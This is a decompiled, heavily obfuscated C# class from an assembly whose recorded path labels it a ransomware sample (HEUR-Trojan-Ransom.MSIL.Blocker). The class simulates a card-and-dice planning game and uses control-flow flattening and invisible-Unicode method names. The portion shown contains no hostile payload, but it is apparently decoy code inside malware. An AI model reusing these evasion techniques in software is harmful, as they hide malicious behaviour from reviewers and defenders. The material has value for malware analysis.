// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Game
// Assembly: RuntimeParameterIn, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: E46F8FBF-E963-420D-9D24-515F2113904E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-899a15627241e59e9347d18a6286ac2587425c3cd941d6b095f01d1a9205dac5.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Cytotechnologist
{
  public class Game
  {
    public readonly Rules Rules;
    public readonly Player[] Players;
    private readonly PlayerState[] _playerStates;
    private readonly Dice _dice;
    private List<Card> _deck;
    public readonly List<int> Winners = new List<int>();
    public readonly List<int> Losers = new List<int>();
    private int _currentPlayer = 2147483645;
    private int _currentTurn;
    private List<float> _chances;
    private readonly Random _random;
    private readonly StringBuilder _buffer;
    private bool _finished;
    private int _currentChanceIndex;

    public Game(JSONNode json, StringBuilder buffer)
    {
      this._buffer = buffer;
      this._random = Game.\u206A‎⁯‏‭⁪‭​⁭⁭‫⁫⁭‮⁯‬⁬‍‪‪‏⁬‪‫‍⁮‫‎‭‏‮‌‬‏‪​⁫⁫‮⁭‮((int) DateTime.Now.Ticks);
      this.Rules = Rules.Deserialize(json["rules"]);
      this._dice = new Dice();
      JSONNode jsonNode = json["players"];
      int count = jsonNode.Count;
      this.Players = new Player[count];
      for (int aIndex = 0; aIndex < count; ++aIndex)
        this.Players[aIndex] = Player.Deserialize(jsonNode[aIndex]);
      this._playerStates = new PlayerState[count];
      for (int index = 0; index < count; ++index)
        this._playerStates[index] = new PlayerState();
    }

    public bool Finished
    {
      get
      {
label_1:
        int num1 = -615792668;
        int index;
        bool finished1;
        PlayerState[] playerStates;
        bool finished2;
        PlayerState playerState;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -562736082)) % 18U)
          {
            case 0:
              goto label_1;
            case 1:
              finished1 = false;
              num1 = (int) num2 * -1776138722 ^ 1260384493;
              continue;
            case 3:
              finished1 = true;
              num1 = (int) num2 * -1016981662 ^ -592844854;
              continue;
            case 4:
              num1 = (int) num2 * 1605262384 ^ -1319924228;
              continue;
            case 5:
              index = 0;
              num1 = (int) num2 * -645961316 ^ -1407938439;
              continue;
            case 6:
              finished2 = this._finished;
              num1 = (int) num2 * -1805276253 ^ -1136873888;
              continue;
            case 7:
              num1 = (int) num2 * -1863338530 ^ -1650828278;
              continue;
            case 8:
              ++index;
              num1 = -736191099;
              continue;
            case 9:
              playerState = playerStates[index];
              num1 = -343104435;
              continue;
            case 10:
              num1 = -989444331;
              continue;
            case 11:
              int num3 = playerState.State != State.Playing ? -1823562120 : (num3 = -2119645299);
              num1 = num3 ^ (int) num2 * -196714902;
              continue;
            case 12:
              int num4 = !finished2 ? 1652546282 : (num4 = 398371832);
              num1 = num4 ^ (int) num2 * 1741376002;
              continue;
            case 13:
              playerStates = this._playerStates;
              num1 = (int) num2 * -1968487340 ^ -1458926055;
              continue;
            case 14:
              num1 = (int) num2 * 791381828 ^ 349793284;
              continue;
            case 15:
              int num5;
              num1 = num5 = index >= playerStates.Length ? -869452223 : (num5 = -626492403);
              continue;
            case 16:
              finished1 = true;
              num1 = (int) num2 * -2007352878 ^ -145152380;
              continue;
            case 17:
              num1 = (int) num2 * 114889607 ^ -478169936;
              continue;
            default:
              goto label_19;
          }
        }
label_19:
        return finished1;
      }
    }

    public void ShuffleCards() => this._deck = new List<Card>((IEnumerable<Card>) this.Rules.Cards);

    public void StartNew()
    {
label_1:
      int num1 = -592194052;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1855952537)) % 8U)
        {
          case 0:
            this.Winners.Clear();
            num1 = (int) num2 * 273889505 ^ 842618920;
            continue;
          case 1:
            goto label_3;
          case 2:
            this._chances = new List<float>((IEnumerable<float>) this.Rules.RiskChances);
            num1 = (int) num2 * -1797247456 ^ -1875359282;
            continue;
          case 3:
            this.ShuffleCards();
            num1 = (int) num2 * -683422782 ^ -531073895;
            continue;
          case 4:
            num1 = (int) num2 * 802440687 ^ 960345006;
            continue;
          case 5:
            this._currentPlayer = this.Players.Length;
            this._currentTurn = 0;
            this._finished = false;
            this._currentChanceIndex = -1;
            num1 = (int) num2 * -1543343613 ^ -1892268302;
            continue;
          case 6:
            goto label_1;
          case 7:
            this.Losers.Clear();
            num1 = (int) num2 * 702381687 ^ -26174286;
            continue;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:;
    }

    public void PlanningState()
    {
label_1:
      int num1 = 1276599022;
      int planningCardsCount;
      int num2;
      PlayerState playerState;
      int index;
      Player player;
      bool morePlanningSprint;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 1341948934)) % 25U)
        {
          case 0:
            num1 = (int) num3 * 717104430 ^ -1304698119;
            continue;
          case 1:
            ++index;
            num1 = (int) num3 * 719972462 ^ 1272088816;
            continue;
          case 2:
            num1 = (int) num3 * 915401120 ^ 1013953187;
            continue;
          case 3:
            playerState.Sprint = 1;
            num1 = (int) num3 * -1507949649 ^ 1457759530;
            continue;
          case 4:
            num2 = planningCardsCount - this.Rules.NormalPlanningCount;
            morePlanningSprint = player.UseOneMorePlanningSprint;
            num1 = 78915026;
            continue;
          case 5:
            playerState.Resources = this.Rules.InitialResources;
            playerState.State = State.Playing;
            planningCardsCount = player.PlanningCardsCount;
            num2 = 0;
            num1 = (int) num3 * -1078214103 ^ -647320495;
            continue;
          case 6:
            num1 = 392875659;
            continue;
          case 7:
            goto label_1;
          case 8:
            num1 = 1191323862;
            continue;
          case 9:
            int num4;
            num1 = num4 = num2 > 0 ? 769521004 : (num4 = 1184142302);
            continue;
          case 10:
            int num5;
            num1 = num5 = index < this.Players.Length ? 1989766543 : (num5 = 1170127960);
            continue;
          case 11:
            playerState.Sprint = -1;
            playerState.Resources -= num2 * this.Rules.NormalPlanningCost;
            num1 = (int) num3 * -758363372 ^ -1470685493;
            continue;
          case 12:
            player = this.Players[index];
            num1 = (int) num3 * 453280103 ^ -443047789;
            continue;
          case 13:
            num1 = (int) num3 * -2110368303 ^ 1282298829;
            continue;
          case 14:
            int num6 = planningCardsCount != 0 ? 1762968857 : (num6 = 46854860);
            num1 = num6 ^ (int) num3 * -1574718407;
            continue;
          case 15:
            playerState.Resources -= num2 * this.Rules.OverPlanningCost;
            num1 = (int) num3 * 55819540 ^ 943141966;
            continue;
          case 16:
            goto label_3;
          case 17:
            num2 = 0;
            num1 = 1887479545;
            continue;
          case 18:
            playerState.Resources -= (planningCardsCount - num2) * this.Rules.NormalPlanningCost;
            num1 = 1897584422;
            continue;
          case 19:
            num1 = (int) num3 * 1553287607 ^ 741991842;
            continue;
          case 20:
            int num7 = morePlanningSprint ? -1261770614 : (num7 = -1321925045);
            num1 = num7 ^ (int) num3 * -1643096436;
            continue;
          case 21:
            num1 = (int) num3 * -44998503 ^ 381235954;
            continue;
          case 22:
            index = 0;
            num1 = (int) num3 * -640865656 ^ -1133072958;
            continue;
          case 23:
            playerState.Sprint = 0;
            num1 = (int) num3 * 749557768 ^ 458170717;
            continue;
          case 24:
            playerState = this._playerStates[index];
            num1 = (int) num3 * -1781958652 ^ 928818895;
            continue;
          default:
            goto label_27;
        }
      }
label_3:
      return;
label_27:;
    }

    public void TurnState()
    {
      ++this._currentPlayer;
label_1:
      int num1 = -757488478;
      bool flag1;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2013410688)) % 17U)
        {
          case 0:
            this.Print((object) Game.\u206C‬‬⁪⁬⁭‬‬⁫⁭‍‏​‭⁭​‬‪⁭⁫‎‭‭‏‎‏⁯⁪⁮‎⁬‌‌‫​‬⁬⁭‌⁪‮("-- BEGINNING OF TURN ", (++this._currentTurn).ToString(), " --"));
            num1 = -388094201;
            continue;
          case 1:
            num1 = (int) num2 * -2016071080 ^ 476951606;
            continue;
          case 2:
            num1 = (int) num2 * 1991752199 ^ -2062851111;
            continue;
          case 3:
            this._currentPlayer = 0;
            num1 = (int) num2 * 1244498066 ^ 1951125453;
            continue;
          case 4:
            this.Print((object) "\n\nGAME STATE\n{0}\n\n-- END OF TURN {1} --\n\n", (object) this, (object) this._currentTurn);
            num1 = (int) num2 * 1519673625 ^ -319849291;
            continue;
          case 5:
            this.Print((object) Game.\u206D⁮⁮‌‏‫‎​‮‌‬‌‏‭⁫‭‮‪⁭​‪‎‭‌​⁯⁮⁭‏⁮‬‏⁭‌‮⁮‎⁫‫‭‮("RISK CHANCE: ", this.Rules.RiskChances[this._currentChanceIndex].ToString()));
            num1 = (int) num2 * -1753193087 ^ -1669494763;
            continue;
          case 6:
            this.PlayerTurn(this._currentPlayer);
            num1 = -772099384;
            continue;
          case 7:
            int num3 = flag1 ? 2115513021 : (num3 = 846713808);
            num1 = num3 ^ (int) num2 * 1756111267;
            continue;
          case 8:
            num1 = (int) num2 * 263802850 ^ 1774923216;
            continue;
          case 9:
            num1 = (int) num2 * -236668694 ^ -923295396;
            continue;
          case 10:
            flag1 = this._currentPlayer >= this.Players.Length;
            num1 = (int) num2 * -27421524 ^ -927751294;
            continue;
          case 11:
            flag2 = this._currentTurn > 0;
            num1 = (int) num2 * 1753406672 ^ 1557990518;
            continue;
          case 12:
            goto label_1;
          case 13:
            num1 = (int) num2 * 334535716 ^ 1644498354;
            continue;
          case 14:
            goto label_3;
          case 15:
            this._currentChanceIndex = (this._currentChanceIndex + 1) % this._chances.Count;
            num1 = (int) num2 * -745857454 ^ 1694217875;
            continue;
          case 16:
            int num4 = flag2 ? 1213383815 : (num4 = 1992184746);
            num1 = num4 ^ (int) num2 * -615145804;
            continue;
          default:
            goto label_19;
        }
      }
label_3:
      return;
label_19:;
    }

    private void PlayerTurn(int playerIndex)
    {
      Player player = this.Players[playerIndex];
label_1:
      int num1 = -949356389;
      while (true)
      {
        uint num2;
        PlayerState playerState1;
        bool flag1;
        int num3;
        PlayerState playerState2;
        bool flag2;
        Card card;
        int num4;
        bool flag3;
        int index;
        int num5;
        bool flag4;
        bool flag5;
        bool flag6;
        bool flag7;
        bool flag8;
        bool onlyOneWinner;
        int num6;
        switch ((num2 = (uint) (num1 ^ -1015360488)) % 86U)
        {
          case 0:
            int num7 = playerState2.Resources >= 0 ? -2137711148 : (num7 = -1676390747);
            num1 = num7 ^ (int) num2 * 640553461;
            continue;
          case 1:
            playerState1 = this._playerStates[playerIndex];
            this.Print((object) Game.\u206D⁮⁮‌‏‫‎​‮‌‬‌‏‭⁫‭‮‪⁭​‪‎‭‌​⁯⁮⁭‏⁮‬‏⁭‌‮⁮‎⁫‫‭‮("\nPLAYER ", playerIndex.ToString()));
            num1 = (int) num2 * 756569542 ^ 1454045196;
            continue;
          case 2:
            num1 = (int) num2 * 1838530782 ^ -1794956551;
            continue;
          case 3:
            playerState1.State = State.Lose;
            flag1 = !this.Losers.Contains(playerIndex);
            num1 = (int) num2 * 1291983265 ^ 1687626831;
            continue;
          case 4:
            flag4 = card.Impact < 0;
            num1 = (int) num2 * -1500554748 ^ -1717524742;
            continue;
          case 5:
            num1 = (int) num2 * 912494242 ^ 1002462295;
            continue;
          case 6:
            this.Print((object) "Still planning");
            num1 = (int) num2 * -730267188 ^ -478123043;
            continue;
          case 7:
            num1 = -229393306;
            continue;
          case 8:
            num1 = (int) num2 * 374780175 ^ -2059457571;
            continue;
          case 9:
            PlayerState playerState3 = playerState1;
            this.Print((object) Game.\u206D⁮⁮‌‏‫‎​‮‌‬‌‏‭⁫‭‮‪⁭​‪‎‭‌​⁯⁮⁭‏⁮‬‏⁭‌‮⁮‎⁫‫‭‮("\t", playerState3 != null ? Game.\u206A‮⁪⁭⁪‌‭‏‮⁭⁮⁮‌‫⁯‫⁪‬⁪⁯⁫‌‏​​⁮‫⁭‭‮‎​‫‪⁫‎⁭‫‎⁮‮((object) playerState3) : (string) null));
            num1 = -1500470340;
            continue;
          case 10:
            this.Print((object) "CARD: {0}, {1}{2} {3} and {4}", (object) card, flag6 ? (object) "ALL " : (object) "", flag4 ? (object) "receives" : (object) "pays", (object) Game.\u202D⁪‪‬​‫‪‮⁭‫‮⁫​⁮‍‌‬⁮⁪‏⁪⁪⁮‬⁯‌⁪⁯⁮‬‌‬⁬‭‪⁬‏‬⁭‮(num3), flag2 ? (object) "advance" : (object) "stay");
            num1 = -434899512;
            continue;
          case 11:
            card = this.DrawCard();
            num1 = -117224808;
            continue;
          case 12:
            num6 = card.Type == 4 ? 1 : 0;
            break;
          case 13:
            ++playerState1.Sprint;
            num1 = (int) num2 * 580258156 ^ -1204284488;
            continue;
          case 14:
            int num8;
            num1 = num8 = num4 < this._playerStates.Length ? -254198377 : (num8 = -1960383294);
            continue;
          case 15:
            this.Losers.Add(playerIndex);
            num1 = (int) num2 * -1905565686 ^ 1472624782;
            continue;
          case 16:
            playerState1.State = State.Won;
            this.Winners.Add(playerIndex);
            num1 = (int) num2 * -739950931 ^ 1312094632;
            continue;
          case 17:
            num1 = (int) num2 * 336764086 ^ -1251222613;
            continue;
          case 18:
            int num9;
            num1 = num9 = index >= this._playerStates.Length ? -955367175 : (num9 = -2097834247);
            continue;
          case 19:
            flag7 = !flag6;
            num1 = (int) num2 * 1089086926 ^ -1144965337;
            continue;
          case 20:
            index = 0;
            num1 = (int) num2 * 492825580 ^ 856231213;
            continue;
          case 21:
            ++num4;
            num1 = -454768210;
            continue;
          case 22:
            num1 = (int) num2 * 1139157133 ^ 226163947;
            continue;
          case 23:
            num1 = (int) num2 * -364652798 ^ 1429192304;
            continue;
          case 24:
            if (this.Rules.EconomicsAffectsAll)
            {
              num1 = (int) num2 * -1719636428 ^ 1142841720;
              continue;
            }
            num6 = 0;
            break;
          case 25:
            ++index;
            num1 = -1275412320;
            continue;
          case 26:
            int num10;
            num1 = num10 = this._dice.Roll(this._chances[this._currentChanceIndex]) ? -730416265 : (num10 = -1049654466);
            continue;
          case 27:
            num1 = (int) num2 * -2101516518 ^ -781765001;
            continue;
          case 28:
            playerState1.Resources -= num3;
            int num11 = playerState1.Resources < 0 ? 928938679 : (num11 = 1291469606);
            num1 = num11 ^ (int) num2 * -1566000835;
            continue;
          case 29:
            flag8 = playerState1.Sprint < 0;
            num1 = -1568194109;
            continue;
          case 30:
            num1 = (int) num2 * -2037975441 ^ 658908409;
            continue;
          case 31:
            num1 = -247005623;
            continue;
          case 32:
            goto label_1;
          case 33:
            flag2 = true;
            num1 = (int) num2 * -796671047 ^ -1435818165;
            continue;
          case 34:
            int num12 = num4 != playerIndex ? 1567008080 : (num12 = 1674448331);
            num1 = num12 ^ (int) num2 * 164514317;
            continue;
          case 35:
            int num13 = !flag7 ? -2073316232 : (num13 = -1648952570);
            num1 = num13 ^ (int) num2 * -673584580;
            continue;
          case 36:
            num1 = (int) num2 * -1673544615 ^ -2019087043;
            continue;
          case 37:
            int num14 = onlyOneWinner ? 1838775850 : (num14 = 464416162);
            num1 = num14 ^ (int) num2 * -355165613;
            continue;
          case 38:
            num5 = card.Impact - player.PlannedForCard(card.Type);
            flag2 = num5 < this.Rules.StayOnSprintMinDiff;
            num1 = (int) num2 * -798948358 ^ -2107575166;
            continue;
          case 39:
            num1 = -1820391121;
            continue;
          case 40:
            num1 = -200857507;
            continue;
          case 41:
            flag3 = !flag4;
            num1 = (int) num2 * -2124484330 ^ -2015903823;
            continue;
          case 42:
            flag5 = playerState1.Sprint > this.Rules.SprintCount;
            num1 = -598853734;
            continue;
          case 43:
            flag2 = true;
            num1 = (int) num2 * 1526366067 ^ 1399420950;
            continue;
          case 44:
            ++playerState1.Sprint;
            num1 = (int) num2 * 1376586483 ^ -1420043648;
            continue;
          case 45:
            playerState2.State = State.Lose;
            num1 = -1980615690;
            continue;
          case 46:
            this.Losers.Add(index);
            num1 = (int) num2 * 86009736 ^ -1235902432;
            continue;
          case 47:
            onlyOneWinner = this.Rules.OnlyOneWinner;
            num1 = (int) num2 * 301536743 ^ 1531718418;
            continue;
          case 48:
            num1 = (int) num2 * 1151871255 ^ -874589201;
            continue;
          case 49:
            flag2 = false;
            num1 = -1179908788;
            continue;
          case 50:
            num3 = Game.\u202C⁪⁭⁮‫⁮‫‭​⁬⁪⁭‫‭⁪‍‪⁮‪⁫⁫‏‪‬‎⁬⁪‭‭‬‎‌‫​‫⁯⁯‪⁮‭‮(0, num5);
            num1 = (int) num2 * 1482005132 ^ 1607782474;
            continue;
          case 51:
            int num15 = playerState1.State != 0 ? -299697458 : (num15 = -1496686750);
            num1 = num15 ^ (int) num2 * -1617180339;
            continue;
          case 52:
            int num16;
            num1 = num16 = !this.Losers.Contains(num4) ? -649639159 : (num16 = -1143950997);
            continue;
          case 53:
            num1 = (int) num2 * -1622844022 ^ 1726979622;
            continue;
          case 54:
            num1 = (int) num2 * 748535582 ^ -626198227;
            continue;
          case 55:
            num1 = -633644022;
            continue;
          case 56:
            playerState2 = this._playerStates[index];
            playerState2.Resources -= Game.\u202C⁪⁭⁮‫⁮‫‭​⁬⁪⁭‫‭⁪‍‪⁮‪⁫⁫‏‪‬‎⁬⁪‭‭‬‎‌‫​‫⁯⁯‪⁮‭‮(0, num3 - this.Players[index].PlannedForCard(card.Type));
            num1 = (int) num2 * 1482252988 ^ -877218418;
            continue;
          case 57:
            num1 = (int) num2 * 1450672647 ^ -608786184;
            continue;
          case 58:
            num1 = (int) num2 * -2091198900 ^ -426543543;
            continue;
          case 59:
            num1 = -943841286;
            continue;
          case 60:
            num1 = (int) num2 * 1421642242 ^ -1744729454;
            continue;
          case 61:
            num1 = (int) num2 * -11220557 ^ 203030490;
            continue;
          case 62:
            num1 = (int) num2 * -1812249722 ^ 1311161060;
            continue;
          case 63:
            num1 = -180540587;
            continue;
          case 64:
            int num17;
            num1 = num17 = !flag2 ? -991014704 : (num17 = -1479109528);
            continue;
          case 65:
            num1 = -2059031721;
            continue;
          case 66:
            int num18 = flag5 ? -927818696 : (num18 = -350281833);
            num1 = num18 ^ (int) num2 * 726183599;
            continue;
          case 67:
            this._finished = true;
            num4 = 0;
            num1 = (int) num2 * -637106418 ^ -1093374655;
            continue;
          case 68:
            num1 = (int) num2 * 1896538545 ^ -1315594003;
            continue;
          case 69:
            this.Print((object) playerState1.State);
            num1 = (int) num2 * 535386737 ^ 1044395187;
            continue;
          case 70:
            num1 = (int) num2 * 1873099611 ^ -1301871329;
            continue;
          case 71:
            int num19 = flag8 ? -715241128 : (num19 = -1199079099);
            num1 = num19 ^ (int) num2 * 1853212051;
            continue;
          case 72:
            int num20 = this.Losers.Contains(index) ? 1415375261 : (num20 = 2091020862);
            num1 = num20 ^ (int) num2 * -287712378;
            continue;
          case 73:
            this.Print((object) "CARD: none, advance");
            num1 = (int) num2 * 1899203517 ^ -450976047;
            continue;
          case 74:
            num1 = (int) num2 * 1399683548 ^ 2025681834;
            continue;
          case 75:
            num1 = (int) num2 * 429466340 ^ 520952976;
            continue;
          case 76:
            num1 = (int) num2 * -2004826598 ^ 1683275765;
            continue;
          case 77:
            goto label_3;
          case 78:
            num1 = (int) num2 * -1637976183 ^ 1057906913;
            continue;
          case 79:
            this.Losers.Add(num4);
            num1 = (int) num2 * 415586832 ^ -167093637;
            continue;
          case 80:
            num3 = card.Impact;
            num1 = (int) num2 * -1400582 ^ -1996504412;
            continue;
          case 81:
            int num21 = !flag3 ? 2120649533 : (num21 = 721151214);
            num1 = num21 ^ (int) num2 * -156934778;
            continue;
          case 82:
            int num22 = flag1 ? 1472099273 : (num22 = 1088566065);
            num1 = num22 ^ (int) num2 * 934617648;
            continue;
          case 83:
            num1 = (int) num2 * -1889104871 ^ 181799980;
            continue;
          case 84:
            num1 = -2070954270;
            continue;
          case 85:
            num1 = (int) num2 * 275090392 ^ 1485473624;
            continue;
          default:
            goto label_91;
        }
        flag6 = num6 != 0;
        num1 = -488335989;
      }
label_3:
      return;
label_91:;
    }

    private Card DrawCard()
    {
      bool flag = this._deck.Count <= 0;
label_1:
      int num1 = 77125346;
      Card card1;
      Card card2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2015328372)) % 9U)
        {
          case 0:
            this.ShuffleCards();
            num1 = (int) num2 * 2118546441 ^ 731997495;
            continue;
          case 1:
            this._deck.RemoveAt(0);
            num1 = (int) num2 * 358706865 ^ -379786368;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -153266184 ^ 102305395;
            continue;
          case 4:
            card1 = this._deck[0];
            num1 = 1522212571;
            continue;
          case 6:
            num1 = (int) num2 * -476895338 ^ -624176074;
            continue;
          case 7:
            int num3 = !flag ? 1967745102 : (num3 = 1064415856);
            num1 = num3 ^ (int) num2 * 1130076605;
            continue;
          case 8:
            card2 = card1;
            num1 = (int) num2 * -1516845534 ^ -962795051;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return card2;
    }

    public string ToString(bool initial)
    {
label_1:
      int num1 = 636217016;
      int index;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 554498647)) % 9U)
        {
          case 1:
            str1 = "";
            num1 = (int) num2 * -280226467 ^ 982479060;
            continue;
          case 2:
            str2 = str1;
            num1 = (int) num2 * 1173530783 ^ -1967068262;
            continue;
          case 3:
            index = 0;
            num1 = (int) num2 * -670283565 ^ -1447335360;
            continue;
          case 4:
            string[] strArray = new string[5]
            {
              str1,
              index.ToString(),
              ": ",
              null,
              null
            };
            PlayerState playerState = this._playerStates[index];
            strArray[3] = playerState != null ? Game.\u206A‮⁪⁭⁪‌‭‏‮⁭⁮⁮‌‫⁯‫⁪‬⁪⁯⁫‌‏​​⁮‫⁭‭‮‎​‫‪⁫‎⁭‫‎⁮‮((object) playerState) : (string) null;
            strArray[4] = "\n";
            str1 = Game.\u202D​⁪‍‍‍‫⁮⁪⁯⁪‮‎‬⁫‫⁪‎⁫⁯‫⁫⁯⁯‮⁭⁪‏⁮‎​‍‮​‪‪⁬‎‬‎‮(strArray);
            num1 = 634161669;
            continue;
          case 5:
            num1 = (int) num2 * 365884148 ^ -744975613;
            continue;
          case 6:
            ++index;
            num1 = (int) num2 * -1747877594 ^ -186015076;
            continue;
          case 7:
            goto label_1;
          case 8:
            int num3;
            num1 = num3 = index < this._playerStates.Length ? 1046341079 : (num3 = 757420171);
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return str2;
    }

    public override string ToString()
    {
      string str = this.ToString(false);
label_1:
      int num1 = 743733755;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1661288456)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1376505259 ^ -1030708992;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    private void Print(object text, params object[] more)
    {
label_1:
      int num1 = -1242554070;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2082911312)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            Game.\u202B‌⁯‫‌⁯‬⁪⁯‪⁮‬⁫⁪‫​⁫‭‎‫​‬‏⁪⁬‫‬⁯‪⁯⁮‫⁭‎‫⁮‌⁫⁯‭‮(this._buffer, str);
            num1 = (int) num2 * -835053318 ^ 465647973;
            continue;
          case 2:
            str = Game.\u200C⁮⁯⁬‪⁪‎‏‌⁬⁫‍⁪‮‬‌‭⁫‎⁮⁫​⁮⁭‌⁫‬‪‎‫‎‏‏⁯⁯⁮‮‍⁯‮‮(Game.\u206A‮⁪⁭⁪‌‭‏‮⁭⁮⁮‌‫⁯‫⁪‬⁪⁯⁫‌‏​​⁮‫⁭‭‮‎​‫‪⁫‎⁭‫‎⁮‮(text), more);
            num1 = (int) num2 * -612094879 ^ -1904809777;
            continue;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    static Random \u206A‎⁯‏‭⁪‭​⁭⁭‫⁫⁭‮⁯‬⁬‍‪‪‏⁬‪‫‍⁮‫‎‭‏‮‌‬‏‪​⁫⁫‮⁭‮([In] int obj0) => new Random(obj0);

    static string \u206C‬‬⁪⁬⁭‬‬⁫⁭‍‏​‭⁭​‬‪⁭⁫‎‭‭‏‎‏⁯⁪⁮‎⁬‌‌‫​‬⁬⁭‌⁪‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static string \u206D⁮⁮‌‏‫‎​‮‌‬‌‏‭⁫‭‮‪⁭​‪‎‭‌​⁯⁮⁭‏⁮‬‏⁭‌‮⁮‎⁫‫‭‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static int \u202C⁪⁭⁮‫⁮‫‭​⁬⁪⁭‫‭⁪‍‪⁮‪⁫⁫‏‪‬‎⁬⁪‭‭‬‎‌‫​‫⁯⁯‪⁮‭‮([In] int obj0, [In] int obj1) => Math.Max(obj0, obj1);

    static int \u202D⁪‪‬​‫‪‮⁭‫‮⁫​⁮‍‌‬⁮⁪‏⁪⁪⁮‬⁯‌⁪⁯⁮‬‌‬⁬‭‪⁬‏‬⁭‮([In] int obj0) => Math.Abs(obj0);

    static string \u206A‮⁪⁭⁪‌‭‏‮⁭⁮⁮‌‫⁯‫⁪‬⁪⁯⁫‌‏​​⁮‫⁭‭‮‎​‫‪⁫‎⁭‫‎⁮‮([In] object obj0) => obj0.ToString();

    static string \u202D​⁪‍‍‍‫⁮⁪⁯⁪‮‎‬⁫‫⁪‎⁫⁯‫⁫⁯⁯‮⁭⁪‏⁮‎​‍‮​‪‪⁬‎‬‎‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200C⁮⁯⁬‪⁪‎‏‌⁬⁫‍⁪‮‬‌‭⁫‎⁮⁫​⁮⁭‌⁫‬‪‎‫‎‏‏⁯⁯⁮‮‍⁯‮‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static StringBuilder \u202B‌⁯‫‌⁯‬⁪⁯‪⁮‬⁫⁪‫​⁫‭‎‫​‬‏⁪⁬‫‬⁯‪⁯⁮‫⁭‎‫⁮‌⁫⁯‭‮(
      [In] StringBuilder obj0,
      [In] string obj1)
    {
      return obj0.AppendLine(obj1);
    }
  }
}
